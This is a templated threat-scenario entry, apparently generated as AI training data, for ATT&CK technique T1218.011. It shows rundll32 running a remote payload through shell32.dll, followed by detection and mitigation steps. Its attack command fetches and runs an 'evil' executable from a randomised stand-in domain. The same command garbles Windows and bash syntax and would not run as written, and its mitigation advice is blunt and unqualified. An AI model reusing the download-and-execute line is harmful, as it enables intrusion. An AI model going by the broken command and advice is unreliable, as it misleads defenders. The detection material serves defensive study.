---
type: campaign
scenario_id: 255
tactic: Defense Evasion
technique: "T1218.011: Rundll32"
technique_id: T1218.011
tags: [campaign, lotl, defense_evasion]
---

# Using rundll32 to execute malicious payload via shell32.dll remotely.

## Threat Description
Using rundll32 to execute malicious payload via shell32.dll remotely.

## Attack Command
```
rundll32 shell32.dll,ShellExec_RunDLL "http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor rundll32 shell32 remote: `wmic process where name='rundll32.exe' get commandline | findstr http`; YARA rule: `rule Rundll32ShellRemote { strings: $a = /rundll32.*shell32.*http/ nocase; condition: $a }`.

## Mitigation
Restrict rundll32: `icacls %windir%\System32\rundll32.exe /deny Everyone:RX`; Block shell32 downloads: `netsh advfirewall firewall add rule name='Block rundll32' dir=out program='%windir%\System32\rundll32.exe' action=block`.

## AI Training Prompt
Train AI to detect rundll32 shell32 remote execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
